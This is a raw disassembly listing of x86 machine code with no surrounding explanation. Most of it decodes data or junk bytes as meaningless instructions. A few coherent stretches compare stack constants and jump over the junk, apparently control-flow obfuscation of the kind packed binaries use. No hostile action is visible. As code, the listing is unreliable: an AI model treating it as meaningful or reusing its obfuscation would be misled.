  41baa8:	pushf  
  41baa9:	add    esp,DWORD PTR [ebp-0x450e5ef7]
  41baaf:	push   esi
  41bab0:	add    ebp,DWORD PTR [ecx+0x42]
  41bab3:	pusha  
  41bab4:	push   esi
  41bab5:	push   ds
  41bab6:	into   
  41bab7:	imul   ebx,ecx,0x7a685a6b
  41babd:	les    esi,FWORD PTR [ecx-0x4e4e00e3]
  41bac3:	jp     0x41ba9b
  41bac5:	xor    dl,dl
  41bac7:	(bad)  
  41bac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bac9:	rcr    DWORD PTR gs:[edi],cl
  41bacc:	aam    0x40
  41bace:	cmc    
  41bacf:	push   es
  41bad0:	out    dx,al
  41bad1:	popa   
  41bad2:	inc    ebx
  41bad3:	sub    al,0x23
  41bad5:	and    bl,bh
  41bad7:	cmp    al,BYTE PTR [edx]
  41bad9:	adc    bl,BYTE PTR ds:0xed96cae7
  41badf:	add    BYTE PTR [ecx],0x0
  41bae2:	push   ebx
  41bae3:	shl    DWORD PTR [esi+0x14],cl
  41bae6:	daa    
  41bae7:	xchg   ebp,eax
  41bae8:	iret   
  41bae9:	xchg   edx,eax
  41baea:	xchg   edi,eax
  41baeb:	and    esp,edi
  41baed:	mov    cl,0xed
  41baef:	lahf   
  41baf0:	push   ebp
  41baf1:	(bad)  
  41baf2:	xor    al,0xbd
  41baf4:	arpl   WORD PTR [ebx-0x3],di
  41baf7:	jns    0x41baa2
  41baf9:	inc    esp
  41bafa:	test   eax,0x82fb06d4
  41baff:	(bad)  
  41bb00:	xchg   esp,eax
  41bb01:	pop    ds
  41bb02:	xor    eax,0xc5f2366a
  41bb07:	and    al,cl
  41bb09:	ds iret 
  41bb0b:	mov    al,ds:0x4cb7e6e5
  41bb10:	or     edx,0x1571e31d
  41bb16:	add    ch,BYTE PTR [edx+0x6f]
  41bb19:	out    0x4f,al
  41bb1b:	outs   dx,BYTE PTR ds:[esi]
  41bb1c:	xor    al,0x1e
  41bb1e:	not    BYTE PTR [edx+0xf6540de]
  41bb24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb25:	mov    ds:0xd70efe88,al
  41bb2a:	mov    edx,0x436007da
  41bb2f:	sbb    dl,BYTE PTR [edx+0x62]
  41bb32:	add    ebx,DWORD PTR [ecx+0x6c]
  41bb35:	adc    eax,0x1de03560
  41bb3a:	inc    esp
  41bb3b:	dec    edi
  41bb3c:	xor    esp,ebp
  41bb3e:	les    ebp,FWORD PTR [ebx+0x6b]
  41bb41:	mov    ds:0xc756acfb,al
  41bb46:	in     al,dx
  41bb47:	mov    edi,0xac3b35ec
  41bb4c:	imul   ecx,DWORD PTR [ebx+0x304807a4],0xbd90e8b1
  41bb56:	je     0x41bb18
  41bb58:	add    dl,ah
  41bb5a:	call   0xfaf0962a
  41bb5f:	jb     0x41bb19
  41bb61:	retf   0xa3eb
  41bb64:	mov    bl,0xa6
  41bb66:	ss pushaw 
  41bb69:	loop   0x41bb69
  41bb6b:	mov    ebp,0x951a4e66
  41bb70:	pop    edi
  41bb71:	jle    0x41bba3
  41bb73:	cmp    esp,edx
  41bb75:	mov    edi,0x8aa7fcb0
  41bb7a:	ret    0x31a1
  41bb7d:	shl    BYTE PTR [eax+eax*8-0x9],1
  41bb81:	aad    0x74
  41bb83:	sahf   
  41bb84:	dec    ebx
  41bb85:	cmp    ebp,ecx
  41bb87:	cwde   
  41bb88:	add    DWORD PTR ds:0x9ea85386,edx
  41bb8e:	push   es
  41bb8f:	ret    0xefb0
  41bb92:	mov    edx,0xa3702b32
  41bb97:	cmp    DWORD PTR [ecx],esp
  41bb99:	adc    DWORD PTR [ebx-0x27],eax
  41bb9c:	dec    esp
  41bb9d:	dec    edx
  41bb9e:	dec    ebp
  41bb9f:	(bad)  
  41bba0:	(bad)  
  41bba1:	neg    DWORD PTR [edx+0x39]
  41bba4:	push   ebx
  41bba5:	sub    ecx,ecx
  41bba7:	or     BYTE PTR [eax-0x5f9b42f0],ah
  41bbad:	add    eax,0x754ceb6b
  41bbb2:	es xchg ebp,eax
  41bbb4:	cmp    DWORD PTR [ebp+0x44],esi
  41bbb7:	bound  ecx,QWORD PTR [edx-0x2a]
  41bbba:	mov    ebx,0x8ebc91cc
  41bbbf:	js     0x41bc02
  41bbc1:	ds sbb al,0xfe
  41bbc4:	cmp    ah,BYTE PTR [ecx-0x3eefafd6]
  41bbca:	pusha  
  41bbcb:	mov    dl,0x10
  41bbcd:	test   eax,0xcf1cd67a
  41bbd2:	and    cx,dx
  41bbd5:	mov    dx,WORD PTR [esp+0x24]
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	test   al,0x60
  41bc03:	and    eax,0x168103aa
  41bc08:	sbb    BYTE PTR [edx+edx*1+0x40811818],bh
  41bc0f:	ds daa 
  41bc11:	cmp    BYTE PTR [edx-0x22],ch
  41bc14:	std    
  41bc15:	or     esi,DWORD PTR [ebx-0xccd00fe]
  41bc1b:	fnstsw WORD PTR [eax]
  41bc1d:	fcomp  QWORD PTR [edx+0x1750d585]
  41bc23:	xchg   edi,eax
  41bc24:	mov    ch,0x43
  41bc26:	loopne 0x41bc22
  41bc28:	mov    bh,BYTE PTR [ecx-0x24]
  41bc2b:	cdq    
  41bc2c:	mov    ebp,0x17a6b334
  41bc31:	mov    ebx,0xa35ceb33
  41bc36:	xchg   bl,ah
  41bc38:	cwde   
  41bc39:	test   BYTE PTR [eax],0x83
  41bc3c:	mov    bl,0x96
  41bc3e:	loop   0x41bbf7
  41bc40:	fwait
  41bc41:	mov    al,ds:0xd84b6d08
  41bc46:	adc    BYTE PTR [esi-0x5b],0x97
  41bc4a:	or     BYTE PTR [ecx-0xf],dl
  41bc4d:	imul   ebp,DWORD PTR [edx-0x6d],0xffffff9c
  41bc51:	cdq    
  41bc52:	jp     0x41bcce
  41bc54:	sub    BYTE PTR [eax+0x9eec6da],0xfb
  41bc5b:	xchg   ebx,eax
  41bc5c:	and    al,dh
  41bc5e:	and    edx,esp
  41bc60:	aam    0x6d
  41bc62:	mov    WORD PTR [eax+0x400246fa],fs
  41bc68:	in     al,0xd3
  41bc6a:	repnz adc BYTE PTR [edi-0x111e6daa],ah
  41bc71:	test   ch,ch
  41bc73:	jecxz  0x41bbf8
  41bc75:	and    ah,ch
  41bc77:	pop    esp
  41bc78:	inc    edx
  41bc79:	enter  0xcd6b,0x85
  41bc7d:	hlt    
  41bc7e:	aam    0xb4
  41bc80:	sub    ebp,DWORD PTR [ebx+0x40]
  41bc83:	xor    al,0x32
  41bc85:	sbb    DWORD PTR [eax+0x3e7d4652],ebp
  41bc8b:	xchg   esp,eax
  41bc8c:	cld    
  41bc8d:	test   DWORD PTR [esi-0x416f6b92],ebp
  41bc93:	push   esi
  41bc94:	out    0x7f,al
  41bc96:	ror    BYTE PTR [eax+0x4c03d4d0],1
  41bc9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc9d:	loop   0x41bc49
  41bc9f:	adc    BYTE PTR [ebp+0x7c],dh
  41bca2:	mov    edx,DWORD PTR [esi-0x2fc1a7f6]
  41bca8:	xor    bh,cl
  41bcaa:	mov    ebp,DWORD PTR [edx+esi*2+0x56973474]
  41bcb1:	push   0x32eb1760
  41bcb6:	mov    cs,ebx
  41bcb8:	(bad)  
  41bcb9:	fbstp  TBYTE PTR [edi+0x5be581da]
  41bcbf:	or     edx,DWORD PTR [ecx+0x32]
  41bcc2:	out    dx,al
  41bcc3:	dec    eax
  41bcc4:	xchg   esi,eax
  41bcc5:	retf   
  41bcc6:	push   edx
  41bcc7:	outs   dx,DWORD PTR ss:[esi]
  41bcc9:	stc    
  41bcca:	push   ds
  41bccb:	pop    ds
  41bccc:	neg    ebx
  41bcce:	sub    al,0x3e
  41bcd0:	pop    edx
  41bcd1:	mov    al,ds:0x68e20a91
  41bcd6:	jge    0x41bc60
  41bcd8:	test   eax,0x9d392bda
  41bcdd:	retf   
  41bcde:	stc    
  41bcdf:	jns    0x41bc9d
  41bce1:	add    DWORD PTR [eax],esi
  41bce3:	add    esi,0xffffffcc
  41bce6:	ja     0x41bd28
  41bce8:	mov    ?,WORD PTR [edi-0x72]
  41bceb:	imul   esp,DWORD PTR [ebx+ecx*4-0x6f],0xe
  41bcf0:	jbe    0x41bcec
  41bcf2:	push   ss
  41bcf3:	mov    cl,0x90
  41bcf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcf6:	leave  
  41bcf7:	daa    
  41bcf8:	nop
  41bcf9:	(bad)  
  41bcfa:	sbb    eax,0x9e2a3f21
  41bcff:	scas   al,BYTE PTR es:[edi]
  41bd00:	pop    eax
  41bd01:	inc    edi
  41bd02:	xchg   ebx,eax
  41bd03:	ja     0x41bd03
  41bd05:	fstp   TBYTE PTR [esi+0x30]
  41bd08:	adc    ecx,DWORD PTR [ecx]
  41bd0a:	(bad)  
  41bd0b:	sbb    al,0xab
  41bd0d:	push   ss
  41bd0e:	or     bl,BYTE PTR [esi-0x79]
  41bd11:	cs sub cl,dh
  41bd14:	or     DWORD PTR ds:0xd1338431,ebx
  41bd1a:	and    eax,0x926f4653
  41bd1f:	and    BYTE PTR [ebp+0x4c964bc6],dl
  41bd25:	repnz in eax,0x0
  41bd28:	(bad)  
  41bd29:	push   cs
  41bd2a:	add    edi,edi
  41bd2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd2d:	mov    esp,0x38303187
  41bd32:	mov    DWORD PTR [ebx],edi
  41bd34:	into   
  41bd35:	jb     0x41bcfd
  41bd37:	mov    ds:0x10f245b3,eax
  41bd3c:	jmp    0xcf8b3f96
  41bd41:	or     bh,BYTE PTR [edx+edi*8-0x61]
  41bd45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd46:	and    eax,0xa8d67e99
  41bd4b:	lea    eax,[eax-0x25f63745]
  41bd51:	sub    eax,ecx
  41bd53:	mov    al,ds:0xff7fd85a
  41bd58:	lods   eax,DWORD PTR ds:[esi]
  41bd59:	xchg   BYTE PTR [ebp-0x6fdb6d2],bh
  41bd5f:	mov    ebp,0x813ebba2
  41bd64:	addr16 mov bl,0xea
  41bd67:	pop    esp
  41bd68:	sbb    BYTE PTR [eax],ah
  41bd6a:	jb     0x41bd51
  41bd6c:	or     bl,BYTE PTR [edi+0x7b]
  41bd6f:	cmp    al,0x97
  41bd71:	pop    es
  41bd72:	xchg   esi,eax
  41bd73:	jmp    0xb0f6:0xfe472eda
  41bd7a:	mov    cl,0xf1
  41bd7c:	jg     0x41bda9
  41bd7e:	jne    0x41bdc5
  41bd80:	fild   QWORD PTR [ecx-0x55]
  41bd83:	outs   dx,DWORD PTR ds:[esi]
  41bd84:	fwait
  41bd85:	pop    ss
  41bd86:	push   cs
  41bd87:	rol    bh,0xa
  41bd8a:	sbb    esi,esp
  41bd8c:	repnz pushf 
  41bd8e:	sbb    eax,0x300c4ded
  41bd93:	xchg   esi,eax
  41bd94:	pushf  
  41bd95:	into   
  41bd96:	in     al,0xf3
  41bd98:	inc    eax
  41bd99:	cmp    eax,0x95036157
  41bd9e:	jae    0x41bd41
  41bda0:	shr    bh,cl
  41bda2:	adc    cl,cl
  41bda4:	in     al,0xad
  41bda6:	loopne 0x41bd46
  41bda8:	adc    esi,eax
  41bdaa:	jg     0x41be00
  41bdac:	push   eax
  41bdad:	xor    DWORD PTR [ecx-0x137b9359],ecx
  41bdb3:	dec    edx
  41bdb4:	cmc    
  41bdb5:	push   ecx
  41bdb6:	loope  0x41bd59
  41bdb8:	scas   al,BYTE PTR es:[edi]
  41bdb9:	ins    BYTE PTR es:[edi],dx
  41bdba:	cwde   
  41bdbb:	sbb    BYTE PTR [ecx],bl
  41bdbd:	jmp    0x41bda1
  41bdbf:	adc    BYTE PTR [edx+0x3e82fb2e],al
  41bdc5:	cmp    al,0x4e
  41bdc7:	sbb    BYTE PTR [esi],dh
  41bdc9:	test   eax,0xc1f0861e
  41bdce:	xor    al,0x89
  41bdd0:	loopne 0x41be41
  41bdd2:	push   ds
  41bdd3:	sub    BYTE PTR [ebx-0x30],dh
  41bdd6:	scas   al,BYTE PTR es:[edi]
  41bdd7:	sub    DWORD PTR [edi+0x1d],ebx
  41bdda:	out    0x4,al
  41bddc:	popa   
  41bddd:	pop    DWORD PTR ds:0x7e63ad78
  41bde3:	mov    eax,?
  41bde5:	arpl   WORD PTR [ecx-0x1e8a90dd],di
  41bdeb:	(bad)  
  41bded:	(bad)  [ebx+0x50]
  41bdf0:	call   0x440a:0x25a0bf4
  41bdf7:	mov    al,ds:0x2e21e270
  41bdfc:	jns    0x41bdd8
  41bdfe:	xchg   edx,eax
  41bdff:	push   esp
  41be00:	mov    cl,0x13
  41be02:	scas   eax,DWORD PTR es:[edi]
  41be03:	fsub   DWORD PTR [eax+0x2c]
  41be06:	popf   
  41be07:	icebp  
  41be08:	jg     0x41bdfb
  41be0a:	ror    BYTE PTR [edx+0x6d],1
  41be0d:	hlt    
  41be0e:	dec    edx
  41be0f:	mov    BYTE PTR [ecx+0x2416fdfa],0xac
  41be16:	loopne 0x41bdac
  41be18:	test   BYTE PTR [ebx],al
  41be1a:	sar    BYTE PTR [edx+eiz*8],0xca
  41be1e:	jno    0x41bde4
  41be20:	and    DWORD PTR [esi-0x5a324076],0x16
  41be27:	mov    ebx,0xabf6e8d5
  41be2c:	or     BYTE PTR [ebx],dh
  41be2e:	imul   ebx,DWORD PTR [ebp-0x41],0x92f5bb9c
  41be35:	add    eax,0x7ad67475
  41be3a:	fdiv   QWORD PTR [ecx+0x5b36405f]
  41be40:	mov    dl,0xf0
  41be42:	inc    eax
  41be43:	jne    0x41bdcd
  41be45:	in     eax,0xde
  41be47:	cmp    edx,DWORD PTR [ebx]
  41be49:	pop    ecx
  41be4a:	pop    ebx
  41be4b:	jae    0x41be5c
  41be4d:	ss mov esp,0xb181fcfa
  41be53:	lock inc edx
  41be55:	push   cs
  41be56:	leave  
  41be57:	mov    esp,0x132a49e4
  41be5c:	mov    bh,0xb8
  41be5e:	cmc    
  41be5f:	(bad)  [ebx-0x3b]
  41be62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be63:	inc    edi
  41be64:	arpl   WORD PTR [ecx-0x75],ax
  41be67:	xlat   BYTE PTR ds:[ebx]
  41be68:	std    
  41be69:	pop    edx
  41be6a:	add    al,0x64
  41be6c:	mov    esi,0xb3da1afd
  41be71:	int    0x7c
  41be73:	push   ss
  41be74:	xchg   edx,eax
  41be75:	or     al,BYTE PTR [eax-0x4d357e8e]
  41be7b:	shl    eax,0x8
  41be7e:	jne    0x41becf
  41be80:	iret   
  41be81:	ja     0x41be2a
  41be83:	jno    0x41be25
  41be85:	or     BYTE PTR [ebx],0x42
  41be88:	pop    edx
  41be89:	adc    al,0x66
  41be8b:	mov    esp,0xb9ff190c
  41be90:	dec    esi
  41be91:	mov    al,0x69
  41be93:	fisttp DWORD PTR [ecx]
  41be95:	jmp    0x41bef5
  41be97:	cmp    esi,DWORD PTR [ecx-0x6b4674c5]
  41be9d:	jmp    0x47e90dc1
  41bea2:	call   0x9986:0xa28656c4
  41bea9:	sbb    BYTE PTR [ebx-0x6958eaa2],bh
  41beaf:	xchg   ebp,eax
  41beb0:	push   ebp
  41beb1:	int3   
  41beb2:	jns    0x41bf2e
  41beb4:	aas    
  41beb5:	(bad)  
  41beb6:	jb     0x41bed2
  41beb8:	xchg   esp,eax
  41beb9:	xor    al,0x9f
  41bebb:	mov    ?,WORD PTR [ebx-0x160be384]
  41bec1:	xchg   edi,eax
  41bec2:	adc    ebp,edx
  41bec4:	sar    dl,0x51
  41bec7:	jo     0x41be5f
  41bec9:	shl    BYTE PTR [eax+0x10fb4f49],cl
  41becf:	jno    0x41bf32
  41bed1:	sar    DWORD PTR ss:[ebx+0x556e8046],cl
  41bed8:	(bad)  
  41bed9:	ficom  WORD PTR [esi+0x67]
  41bedc:	aad    0x80
  41bede:	mov    al,ds:0x1ececeb9
  41bee3:	pop    edi
  41bee4:	nop
  41bee5:	push   ebx
  41bee6:	fs out dx,eax
  41bee8:	mov    al,0x54
  41beea:	pusha  
  41beeb:	adc    eax,ebx
  41beed:	inc    esi
  41beee:	test   al,0x1a
  41bef0:	jb     0x41bf4e
  41bef2:	cld    
  41bef3:	dec    ebx
  41bef4:	cmp    al,0x51
  41bef6:	xor    eax,DWORD PTR [edx-0x3b7daaf9]
  41befc:	pop    edi
  41befd:	push   ebx
  41befe:	lock dec edi
  41bf00:	shl    ecx,0x7c
  41bf03:	popf   
  41bf04:	mov    ebx,0xb616430a
  41bf09:	xor    DWORD PTR [ebp-0x7],esi
  41bf0c:	inc    eax
  41bf0d:	aas    
  41bf0e:	arpl   WORD PTR [ecx],si
  41bf10:	ins    BYTE PTR es:[edi],dx
  41bf11:	imul   eax,DWORD PTR [esi],0x237f56e
  41bf17:	xchg   ebx,eax
  41bf18:	(bad)  [ebp-0x44a01944]
  41bf1e:	outs   dx,DWORD PTR ds:[esi]
  41bf1f:	daa    
  41bf20:	sbb    dl,BYTE PTR [edi+0x6]
  41bf23:	push   es
  41bf24:	dec    eax
  41bf25:	int3   
  41bf26:	je     0x41bf56
  41bf28:	fcmovnbe st,st(6)
  41bf2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf2b:	adc    BYTE PTR [ebx],ah
  41bf2d:	add    ch,BYTE PTR [edx+0x5b]
  41bf30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf31:	vrsqrtss xmm1,xmm7,xmm5
  41bf35:	pop    ebp
  41bf36:	dec    ecx
  41bf37:	sub    DWORD PTR [ecx+eax*2-0x55],edx
  41bf3b:	loop   0x41bf07
  41bf3d:	cmp    edx,DWORD PTR [eax+0x4ea6d52c]
  41bf43:	bound  ebp,QWORD PTR [edi+0x3c]
  41bf46:	ins    DWORD PTR es:[edi],dx
  41bf47:	xchg   al,al
  41bf49:	(bad)  
  41bf4a:	and    ebp,DWORD PTR [ebx]
  41bf4c:	repnz cmp BYTE PTR [edi+0x713ae356],dh
  41bf53:	mov    al,ah
  41bf55:	dec    edi
  41bf56:	pop    ebp
  41bf57:	mov    edx,0x438222dd
  41bf5c:	test   eax,0x45201a11
  41bf61:	push   ss
  41bf62:	or     al,0x5d
  41bf64:	sub    al,0x71
  41bf66:	dec    edi
  41bf67:	fdivrp st(6),st
  41bf69:	cmc    
  41bf6a:	adc    al,bh
  41bf6c:	xlat   BYTE PTR ds:[ebx]
  41bf6d:	cmp    ebp,DWORD PTR [edx+0x2e]
  41bf70:	repnz and cl,BYTE PTR [eax-0x7a9ac095]
  41bf77:	pop    es
  41bf78:	stos   BYTE PTR es:[edi],al
  41bf79:	adc    al,0x4e
  41bf7b:	sahf   
  41bf7c:	sub    BYTE PTR [esi],al
  41bf7e:	jnp    0x41bf81
  41bf80:	sbb    al,BYTE PTR [edx]
  41bf82:	jmp    0x41bf71
  41bf84:	pop    es
  41bf85:	adc    eax,0x8f79fb02
  41bf8a:	adc    eax,0xdf96e79e
  41bf8f:	inc    ebx
  41bf90:	imul   edx,DWORD PTR [edi+0x157e4199],0x5e0f4ad7
  41bf9a:	adc    DWORD PTR [edi],0xfffffffe
  41bf9d:	aaa    
  41bf9e:	lods   eax,DWORD PTR ds:[esi]
  41bf9f:	dec    eax
  41bfa0:	jmp    0xca36:0x3884437c
  41bfa7:	and    esi,DWORD PTR [eax+0x405ac72e]
  41bfad:	push   esp
  41bfae:	sub    al,0x8
  41bfb0:	sar    BYTE PTR [eax-0xb39c31c],0x2e
  41bfb7:	sub    al,0xc5
  41bfb9:	in     al,0xe0
  41bfbb:	js     0x41bf9f
  41bfbd:	outs   dx,DWORD PTR ds:[esi]
  41bfbe:	inc    esi
  41bfbf:	mov    ecx,0x57d4
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	push   eax
  41c0f7:	adc    ecx,ebp
  41c0f9:	jo     0x41c0a2
  41c0fb:	jns    0x41c113
  41c0fd:	sbb    BYTE PTR [edx+edx*1-0x860e7e8],bh
  41c104:	loopne 0x41c136
  41c106:	add    al,0x7a
  41c108:	cmc    
  41c109:	mov    DWORD PTR [ecx+0x10e34748],ecx
  41c10f:	push   edx
  41c110:	rcr    BYTE PTR [ebp+0x7a2076d],cl
  41c116:	xchg   ecx,eax
  41c117:	ins    BYTE PTR es:[edi],dx
  41c118:	xor    al,0xe7
  41c11a:	jne    0x41c16b
  41c11c:	sahf   
  41c11d:	cwde   
  41c11e:	(bad)  
  41c11f:	jg     0x41c18e
  41c121:	or     dh,bh
  41c123:	or     ecx,DWORD PTR [edi]
  41c125:	xor    bh,BYTE PTR [ecx-0xdf0da31]
  41c12b:	es popf 
  41c12d:	fimul  DWORD PTR [edi]
  41c12f:	(bad)  
  41c130:	fstp   st(7)
  41c132:	ds sub eax,0x710a385b
  41c138:	add    bh,ch
  41c13a:	das    
  41c13b:	aam    0xe7
  41c13d:	(bad)  
  41c13e:	jb     0x41c1a7
  41c140:	jno    0x41c18d
  41c142:	mov    dl,0x6c
  41c144:	push   ds
  41c145:	leave  
  41c146:	sbb    BYTE PTR [ecx-0x40],dl
  41c149:	or     eax,esp
  41c14b:	add    dh,ch
  41c14d:	out    0x26,eax
  41c14f:	mov    bl,0xc6
  41c151:	fisttp DWORD PTR [eax+ebx*2-0x536282a9]
  41c158:	es pop ebx
  41c15a:	inc    ebp
  41c15b:	pop    di
  41c15d:	(bad)  
  41c15e:	adc    cl,bl
  41c160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c161:	push   ecx
  41c162:	fidiv  DWORD PTR [ecx+0x51c01ac]
  41c168:	lahf   
  41c169:	es in  eax,dx
  41c16b:	xchg   esi,eax
  41c16c:	imul   DWORD PTR [ecx-0x2b4886b]
  41c172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c173:	imul   edx,DWORD PTR [ecx+eax*1],0x54d38a60
  41c17a:	aad    0x4c
  41c17c:	sahf   
  41c17d:	pop    esi
  41c17e:	adc    BYTE PTR [ebx-0x60],0x9a
  41c182:	iret   
  41c183:	popf   
  41c184:	mov    ds:0xcc9503d9,al
  41c189:	out    0x82,al
  41c18b:	(bad)  
  41c18c:	out    dx,al
  41c18d:	ins    DWORD PTR es:[edi],dx
  41c18e:	mov    ebx,0x7aebc7f0
  41c193:	inc    edx
  41c194:	xchg   esi,eax
  41c195:	in     al,0x53
  41c197:	gs repz jae 0x41c187
  41c19b:	clc    
  41c19c:	nop
  41c19d:	mov    al,ds:0x8911f88e
  41c1a2:	pop    esp
  41c1a3:	or     eax,0xa3b75a56
  41c1a8:	cld    
  41c1a9:	dec    ebx
  41c1aa:	push   ds
  41c1ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1ac:	pop    ss
  41c1ad:	jp     0x41c1ab
  41c1af:	ror    ebx,0xc
  41c1b2:	pop    edi
  41c1b3:	scas   al,BYTE PTR es:[edi]
  41c1b4:	shl    BYTE PTR [ebx+ecx*8-0x7e98c9a5],0x9d
  41c1bc:	imul   esi,esp,0x11
  41c1bf:	shr    dl,cl
  41c1c1:	push   cs
  41c1c2:	out    0x5,al
  41c1c4:	sbb    bl,bl
  41c1c6:	je     0x41c217
  41c1c8:	aam    0x3e
  41c1ca:	dec    ebx
  41c1cb:	mov    edi,0x43d716ac
  41c1d0:	es jle 0x41c1d7
  41c1d3:	std    
  41c1d4:	inc    esi
  41c1d5:	mov    ah,0x41
  41c1d7:	les    ecx,FWORD PTR [edi]
  41c1d9:	or     BYTE PTR [edi-0x3e],ch
  41c1dc:	ds xchg esi,eax
  41c1de:	xchg   esp,esi
  41c1e0:	mov    ah,bh
  41c1e2:	popa   
  41c1e3:	lahf   
  41c1e4:	dec    ebx
  41c1e5:	stos   BYTE PTR es:[edi],al
  41c1e6:	int    0xe8
  41c1e8:	sar    DWORD PTR [eax],cl
  41c1ea:	out    dx,al
  41c1eb:	dec    edi
  41c1ec:	sub    eax,0x5c972788
  41c1f1:	pop    ss
  41c1f2:	ret    
  41c1f3:	mov    ebx,0x7451a249
  41c1f8:	inc    eax
  41c1f9:	fidiv  WORD PTR [edi-0x2f04c19d]
  41c1ff:	mov    bl,0xc0
  41c201:	push   ebp
  41c202:	jb     0x41c1a1
  41c204:	sbb    al,0x41
  41c206:	cmp    DWORD PTR [ecx+edi*8-0x68ce1279],0xe82ce065
  41c211:	daa    
  41c212:	std    
  41c213:	dec    ebp
  41c214:	das    
  41c215:	cli    
  41c216:	sub    DWORD PTR [edi],0x6e86a3d4
  41c21c:	jb     0x41c28d
  41c21e:	ss xor al,0x78
  41c221:	add    DWORD PTR [ebx-0x53af80b8],esi
  41c227:	test   DWORD PTR [eax],esp
  41c229:	aas    
  41c22a:	or     esp,esi
  41c22c:	out    dx,al
  41c22d:	dec    ebx
  41c22e:	and    dh,dh
  41c230:	inc    ebp
  41c231:	jmp    0x6616:0xd67c94a1
  41c238:	dec    ebp
  41c239:	cmovbe edi,DWORD PTR [esi+edi*1+0x7315a4d3]
  41c241:	sbb    esp,DWORD PTR [ebp-0x20396879]
  41c247:	fwait
  41c248:	xor    edx,esi
  41c24a:	test   BYTE PTR [esi],dl
  41c24c:	arpl   WORD PTR [ecx+ebp*1+0x78],sp
  41c250:	hlt    
  41c251:	dec    ebp
  41c252:	sub    BYTE PTR [eax+0x4eaf65f9],bl
  41c258:	arpl   WORD PTR [edx-0x21f7be0b],ax
  41c25e:	cli    
  41c25f:	add    al,0x56
  41c261:	xor    DWORD PTR [edx+0x32],ecx
  41c264:	mov    ebx,0xc3600ea1
  41c269:	xor    esp,ebp
  41c26b:	ret    0xbb1a
  41c26e:	push   ds
  41c26f:	jns    0x41c2da
  41c271:	scas   al,BYTE PTR es:[edi]
  41c272:	jl     0x41c206
  41c274:	jb     0x41c252
  41c276:	iret   
  41c277:	fidivr DWORD PTR [eax+0x4547635c]
  41c27d:	dec    eax
  41c27e:	xor    bl,dl
